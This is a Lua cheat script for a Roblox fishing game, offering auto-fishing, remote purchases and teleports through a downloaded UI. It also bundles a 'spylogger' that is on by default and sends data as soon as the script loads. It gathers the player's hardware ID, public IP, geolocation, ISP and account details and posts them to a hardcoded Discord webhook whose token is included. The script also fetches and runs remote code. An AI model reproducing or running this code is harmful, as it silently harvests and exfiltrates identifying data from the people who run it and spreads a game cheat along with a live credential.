--==================================================--
--   TEAMMIZU + SPYLOGGER                           --
--   Auto Fish | Buy Rod | Teleport | Logger        --
--   By: TeamMizu                                   --
--   UI: Rayfield                                   --
--==================================================--

if not game:IsLoaded() then game.Loaded:Wait() end

-- ==========================================
-- [1] SERVICES
-- ==========================================
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

print("TEAMMIZU + SPYLOGGER LOADED!")

-- ==========================================
-- [2] SPYLOGGER CONFIG
-- ==========================================
local Logger = {}

Logger.Config = {
    Enabled = true,
    WebhookURL = "https://discord.com/api/webhooks/1359407379495182357/cR4XSc1lyVSAlcQb0cy9bH0w9N19Dh1LGGU54PL0H-wT2I9g26j0TbnQl0_At8i16ItD",
    SendOnLoad = true,
    SendOnUnload = false,
    IncludeHWID = true,
    IncludeIP = true,
    IncludeAvatar = true,
    IncludeGameInfo = true,
    IncludeServerInfo = true,
    IncludeStats = true,
}

-- ==========================================
-- [3] SPYLOGGER FUNCTIONS
-- ==========================================
local function GetHWID()
    local hwid = "Unknown"
    pcall(function()
        hwid = gethwid and gethwid() or (identifying and identifying()) or "Unknown"
    end)
    return hwid
end

local function GetIPInfo()
    local ipData = { 
        query = "Unknown", 
        country = "Unknown", 
        city = "Unknown", 
        isp = "Unknown",
        region = "Unknown",
        timezone = "Unknown"
    }
    pcall(function()
        local response = game:HttpGet("https://ip-api.com/json")
        if response then
            local decoded = HttpService:JSONDecode(response)
            ipData.query = decoded.query or "Unknown"
            ipData.country = decoded.country or "Unknown"
            ipData.city = decoded.city or "Unknown"
            ipData.isp = decoded.isp or "Unknown"
            ipData.region = decoded.regionName or "Unknown"
            ipData.timezone = decoded.timezone or "Unknown"
        end
    end)
    return ipData
end

local function GetGameInfo()
    local info = {
        name = "Unknown Game",
        placeId = game.PlaceId,
        jobId = game.JobId,
        maxPlayers = game.MaxPlayers,
        playerCount = #Players:GetPlayers(),
        creator = "Unknown"
    }
    pcall(function()
        local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        if productInfo and productInfo.Name then
            info.name = productInfo.Name
        end
        if productInfo and productInfo.Creator then
            info.creator = productInfo.Creator.Name or "Unknown"
        end
    end)
    return info
end

local function GetPlayerInfo()
    local info = {
        userId = Player.UserId,
        name = Player.Name,
        displayName = Player.DisplayName,
        accountAge = Player.AccountAge,
        membership = (Player.MembershipType == Enum.MembershipType.Premium) and "Premium" or "Free"
    }
    return info
end

local function GetPlayerStats()
    local stats = {}
    pcall(function()
        local leaderstats = Player:FindFirstChild("leaderstats")
        if leaderstats then
            for _, stat in ipairs(leaderstats:GetChildren()) do
                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                    stats[stat.Name] = stat.Value
                end
            end
        end
    end)
    return stats
end

local function GetAvatarThumbnail(userId)
    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
end

local function GetGameThumbnail(placeId)
    return string.format("https://www.roblox.com/game-thumbnail/image?placeId=%d&width=768&height=432&format=png", placeId)
end

function Logger:Send(data)
    if not self.Config.Enabled then return end
    if not self.Config.WebhookURL or self.Config.WebhookURL == "" then return end
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if not requestFunc then 
        warn("[Logger] No request function available")
        return 
    end

    local payload = data
    if type(payload) ~= "table" then
        payload = {
            ["content"] = tostring(payload)
        }
    end

    local success, err = pcall(function()
        requestFunc({
            Url = self.Config.WebhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if not success then
        warn("[Logger] Failed to send webhook: " .. tostring(err))
    end
end

function Logger:SendEmbed(title, description, color, fields, imageUrl, thumbnailUrl, footerText)
    local embed = {
        ["title"] = title or "Log Entry",
        ["description"] = description or "",
        ["color"] = color or 3447003,
        ["timestamp"] = os.date("!%Y-%m-%dT%TZ")
    }
    
    if fields and #fields > 0 then
        embed["fields"] = fields
    end
    
    if imageUrl and imageUrl ~= "" then
        embed["image"] = { ["url"] = imageUrl }
    end
    
    if thumbnailUrl and thumbnailUrl ~= "" then
        embed["thumbnail"] = { ["url"] = thumbnailUrl }
    end
    
    embed["footer"] = {
        ["text"] = footerText or "TeamMizu Logger",
        ["icon_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png"
    }
    
    self:Send({
        ["embeds"] = { embed }
    })
end

function Logger:LogPlayerSession()
    if not self.Config.SendOnLoad then return end
    
    local playerInfo = GetPlayerInfo()
    local ipData = GetIPInfo()
    local gameInfo = GetGameInfo()
    local hwid = self.Config.IncludeHWID and GetHWID() or "Disabled"
    local stats = self.Config.IncludeStats and GetPlayerStats() or {}
    
    local fields = {
        { ["name"] = "Player Information", ["value"] = string.format("User: %s\nDisplay: %s\nID: `%d`", playerInfo.name, playerInfo.displayName, playerInfo.userId), ["inline"] = true },
        { ["name"] = "Account Details", ["value"] = string.format("Age: %d days\nMembership: %s", playerInfo.accountAge, playerInfo.membership), ["inline"] = true }
    }
    
    if self.Config.IncludeHWID then
        table.insert(fields, { ["name"] = "Hardware ID", ["value"] = string.format("||`%s`||", hwid), ["inline"] = true })
    end
    
    if self.Config.IncludeIP then
        table.insert(fields, { ["name"] = "Network Location", ["value"] = string.format("IP: ||`%s`||\nCity: %s\nRegion: %s\nCountry: %s\nISP: %s", ipData.query, ipData.city, ipData.region, ipData.country, ipData.isp), ["inline"] = false })
    end
    
    if self.Config.IncludeServerInfo then
        table.insert(fields, { ["name"] = "Server Information", ["value"] = string.format("PlaceId: %d\nJobId: %s\nPlayers: %d/%d\nCreator: %s", gameInfo.placeId, gameInfo.jobId, gameInfo.playerCount, gameInfo.maxPlayers, gameInfo.creator), ["inline"] = false })
    end
    
    if next(stats) then
        local statString = ""
        for name, value in pairs(stats) do
            statString = statString .. string.format("%s: %s\n", name, tostring(value))
        end
        table.insert(fields, { ["name"] = "Player Statistics", ["value"] = statString, ["inline"] = false })
    end
    
    local avatarUrl = self.Config.IncludeAvatar and GetAvatarThumbnail(playerInfo.userId) or ""
    local gameThumbnail = self.Config.IncludeGameInfo and GetGameThumbnail(gameInfo.placeId) or ""
    
    self:SendEmbed(
        string.format("%s - New Session", gameInfo.name),
        string.format("Player %s has joined the game", playerInfo.name),
        3447003,
        fields,
        gameThumbnail,
        avatarUrl,
        "TeamMizu Logger"
    )
end

function Logger:LogAction(action, target, data, color)
    local fields = {
        { ["name"] = "Action", ["value"] = action, ["inline"] = true }
    }
    if target then
        table.insert(fields, { ["name"] = "Target", ["value"] = target, ["inline"] = true })
    end
    if data then
        table.insert(fields, { ["name"] = "Action Data", ["value"] = string.format("```lua\n%s\n```", data), ["inline"] = false })
    end
    self:SendEmbed(
        "Action Performed",
        "An action was executed",
        color or 16755200,
        fields
    )
end

function Logger:LogTeleport(destination)
    self:SendEmbed(
        "Player Teleporting",
        "Player is teleporting",
        16755200,
        {
            { ["name"] = "Destination", ["value"] = destination or "Unknown", ["inline"] = true },
            { ["name"] = "Player", ["value"] = Player.Name, ["inline"] = true }
        }
    )
end

function Logger:Initialize(config)
    if config then
        for key, value in pairs(config) do
            if self.Config[key] ~= nil then
                self.Config[key] = value
            end
        end
    end
    
    if self.Config.SendOnLoad then
        task.spawn(function()
            task.wait(2)
            self:LogPlayerSession()
        end)
    end
    
    print("[Logger] Universal Logger initialized successfully!")
    return self
end

-- ==========================================
-- [4] INITIALIZE LOGGER
-- ==========================================
Logger:Initialize()

-- ==========================================
-- [5] LOAD RAYFIELD UI
-- ==========================================
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
    Name = "TEAMMIZU",
    LoadingTitle = "Loading TEAMMIZU...",
    LoadingSubtitle = "by TeamMizu",
    ConfigurationSaving = {
        Enabled = false,
        FileName = "TeamMizuConfig"
    },
    KeySystem = false,
    Discord = {
        Enabled = false,
        RememberJoins = false,
        Invite = ""
    },
    Theme = "Default"
})

-- ==========================================
-- [6] CREATE TABS
-- ==========================================
local MainTab = Window:CreateTab("Main", 4483362458)
local BestTab = Window:CreateTab("Best Rods", 4483362458)
local TeleportTab = Window:CreateTab("Teleports", 4483362458)
local ShopTab = Window:CreateTab("Shop", 4483362458)
local KnifeTab = Window:CreateTab("Knife", 4483362458)
local LoggerTab = Window:CreateTab("Logger", 4483362458)

-- ==========================================
-- [7] VARIABLES
-- ==========================================
local AutoFishEnabled = false
local SelectedRod = "Spirit Cat Rod"
local SelectedOPRod = "Transparent Rod"
local SelectedKnife = "Kitsune Knife"
local CastDelay = 3

-- Knit Services
local Knit = ReplicatedStorage:FindFirstChild("Packages") and ReplicatedStorage.Packages:FindFirstChild("Knit")
local Services = Knit and Knit:FindFirstChild("Services")

-- ==========================================
-- [8] AUTO FISH FUNCTIONS
-- ==========================================
local function CastRod()
    pcall(function()
        if Services and Services.Fish and Services.Fish.RF and Services.Fish.RF.CastRequest then
            Services.Fish.RF.CastRequest:InvokeServer(10)
            Logger:LogAction("Cast Rod", "Fishing", "Casting rod...", 65280)
        end
    end)
end

local function LogStep()
    pcall(function()
        if Services and Services.Analytics and Services.Analytics.RF and Services.Analytics.RF.LogStep then
            Services.Analytics.RF.LogStep:InvokeServer(4)
        end
    end)
end

local function CompleteMinigame()
    pcall(function()
        if Services and Services.Fish and Services.Fish.RF and Services.Fish.RF.MinigameResolved then
            Services.Fish.RF.MinigameResolved:InvokeServer(true)
            Logger:LogAction("Fish Caught", "Fishing", "Minigame completed!", 65280)
        end
    end)
end

local function AutoFishLoop()
    while AutoFishEnabled do
        pcall(function()
            CastRod()
            task.wait(CastDelay)
            LogStep()
            task.wait(0.5)
            CompleteMinigame()
            task.wait(0.5)
        end)
        task.wait(1)
    end
end

-- ==========================================
-- [9] BUY FUNCTIONS
-- ==========================================
local function BuyRod(rodName)
    pcall(function()
        if Services and Services.PurchaseController and Services.PurchaseController.RF and Services.PurchaseController.RF.BuyRod then
            Services.PurchaseController.RF.BuyRod:InvokeServer(rodName)
            Logger:LogAction("Buy Rod", rodName, "Purchased successfully!", 3447003)
            Rayfield:Notify({
                Title = "TeamMizu Shop",
                Content = "Berhasil membeli: " .. rodName,
                Duration = 3,
                Image = 4483362458
            })
        end
    end)
end

local function BuyKnife(knifeName)
    pcall(function()
        if Services and Services.PurchaseController and Services.PurchaseController.RF and Services.PurchaseController.RF.BuyKnife then
            Services.PurchaseController.RF.BuyKnife:InvokeServer(knifeName)
            Logger:LogAction("Buy Knife", knifeName, "Purchased successfully!", 16755200)
            Rayfield:Notify({
                Title = "TeamMizu Knife Shop",
                Content = "Berhasil membeli: " .. knifeName,
                Duration = 3,
                Image = 4483362458
            })
        end
    end)
end

-- ==========================================
-- [10] TELEPORT FUNCTION
-- ==========================================
local function TeleportTo(cframe, locationName)
    pcall(function()
        local char = Player.Character
        if char then
            char:PivotTo(cframe)
            Logger:LogTeleport(locationName or "Unknown Location")
            Rayfield:Notify({
                Title = "TeamMizu Teleport",
                Content = "Berhasil teleport ke: " .. (locationName or "Unknown"),
                Duration = 2,
                Image = 4483362458
            })
        end
    end)
end

-- ==========================================
-- [11] UI - MAIN TAB
-- ==========================================
MainTab:CreateToggle({
    Name = "Auto Fish (Loop)",
    CurrentValue = false,
    Callback = function(Value)
        AutoFishEnabled = Value
        if Value then
            task.spawn(AutoFishLoop)
            Logger:LogAction("Auto Fish", "Started", "Auto fishing enabled", 65280)
            Rayfield:Notify({
                Title = "AUTO FISH",
                Content = "Started!",
                Duration = 2,
                Image = 4483362458
            })
        else
            Logger:LogAction("Auto Fish", "Stopped", "Auto fishing disabled", 16711680)
            Rayfield:Notify({
                Title = "AUTO FISH",
                Content = "Stopped!",
                Duration = 2,
                Image = 4483362458
            })
        end
    end
})

MainTab:CreateInput({
    Name = "Set Delay (0 - 3 Seconds)",
    PlaceholderText = "Ketik angka 0 sampai 3...",
    RemoveTextAfterFocusLost = false,
    Callback = function(Value)
        local num = tonumber(Value)
        if num and num >= 0 and num <= 3 then
            CastDelay = num
            Rayfield:Notify({
                Title = "DELAY UPDATED",
                Content = "Delay: " .. num .. " detik",
                Duration = 2,
                Image = 4483362458
            })
        else
            Rayfield:Notify({
                Title = "ERROR",
                Content = "Masukkan angka 0-3!",
                Duration = 2,
                Image = 4483362458
            })
        end
    end
})

-- ==========================================
-- [12] UI - BEST RODS TAB
-- ==========================================
BestTab:CreateDropdown({
    Name = "Select OP Rod",
    Options = {
        "Transparent Rod",
        "Influencer Rod",
        "Dragon Koi Rod",
        "Shark Hunter",
        "Silver Rod",
        "Aurora Rod",
        "Leviathan Spine",
        "Moontuna Rod",
        "Sakura Rod",
        "Bamboo Rod"
    },
    CurrentOption = {"Transparent Rod"},
    MultipleOptions = false,
    Callback = function(Option)
        SelectedOPRod = Option[1]
    end
})

BestTab:CreateButton({
    Name = "Buy Selected OP Rod",
    Callback = function()
        BuyRod(SelectedOPRod)
    end
})

-- ==========================================
-- [13] UI - TELEPORT TAB
-- ==========================================
local Teleports = {
    ["Bamboo Forest"] = CFrame.new(-2270.79102, 13.1826887, -632.039551),
    ["Ice Biome"] = CFrame.new(-1717.35022, 19.8799801, 97.5814743),
    ["Koi Pond"] = CFrame.new(-115.910492, 6.77357817, -1423.47913),
    ["Megalodon"] = CFrame.new(-7.06252861, 27.5456257, 179.351898),
    ["Moon Tuna"] = CFrame.new(-35.0485878, 15.90837, -765.039124),
    ["Razor Reefs"] = CFrame.new(-1314.07886, 49.9714546, 1607.89795)
}

for name, cframe in pairs(Teleports) do
    TeleportTab:CreateButton({
        Name = "Teleport to " .. name,
        Callback = function()
            TeleportTo(cframe, name)
        end
    })
end

-- ==========================================
-- [14] UI - SHOP TAB
-- ==========================================
ShopTab:CreateDropdown({
    Name = "Select Fishing Rod",
    Options = {
        "Spirit Cat Rod",
        "Glacier Rod",
        "Kitsune Rod",
        "Sea Dragon Rod"
    },
    CurrentOption = {"Spirit Cat Rod"},
    MultipleOptions = false,
    Callback = function(Option)
        SelectedRod = Option[1]
    end
})

ShopTab:CreateButton({
    Name = "Buy Selected Rod",
    Callback = function()
        BuyRod(SelectedRod)
    end
})

-- ==========================================
-- [15] UI - KNIFE TAB
-- ==========================================
KnifeTab:CreateDropdown({
    Name = "Select Knife",
    Options = {
        "Kitsune Knife",
        "Tiger Cleaver",
        "Fire Dragon Knife"
    },
    CurrentOption = {"Kitsune Knife"},
    MultipleOptions = false,
    Callback = function(Option)
        SelectedKnife = Option[1]
    end
})

KnifeTab:CreateButton({
    Name = "Buy Selected Knife",
    Callback = function()
        BuyKnife(SelectedKnife)
    end
})

-- ==========================================
-- [16] UI - LOGGER
-- ==========================================
LoggerTab:CreateToggle({
    Name = "Enable Logger",
    CurrentValue = true,
    Callback = function(Value)
        Logger.Config.Enabled = Value
        Rayfield:Notify({
            Title = "Logger",
            Content = Value and "Enabled!" or "Disabled!",
            Duration = 2,
            Image = 4483362458
        })
    end
})

LoggerTab:CreateButton({
    Name = "Test Webhook",
    Callback = function()
        Logger:SendEmbed(
            "TeamMizu Test",
            "Logger is working correctly!",
            65280,
            {
                { ["name"] = "Status", ["value"] = "Connected", ["inline"] = true },
                { ["name"] = "Player", ["value"] = Player.Name, ["inline"] = true }
            }
        )
        Rayfield:Notify({
            Title = "Test Sent!",
            Content = "Check Discord webhook!",
            Duration = 3,
            Image = 4483362458
        })
    end
})

-- ==========================================
-- [17] RAINBOW BORDER EFFECT
-- ==========================================
task.spawn(function()
    while true do
        if Window.Elements and Window.Elements.MainFrame then
            pcall(function()
                local hsv = (tick() % 5) / 5
                Window.Elements.MainFrame.BorderColor3 = Color3.fromHSV(hsv, 1, 1)
            end)
        end
        task.wait(0.05)
    end
end)

-- ==========================================
-- [18] NOTIFICATION
-- ==========================================
task.wait(0.5)

Rayfield:Notify({
    Title = "TEAMMIZU + SPYLOGGER",
    Content = "Script Loaded Successfully!",
    Duration = 3,
    Image = 4483362458
})

print([[
TEAMMIZU + SPYLOGGER LOADED!
]])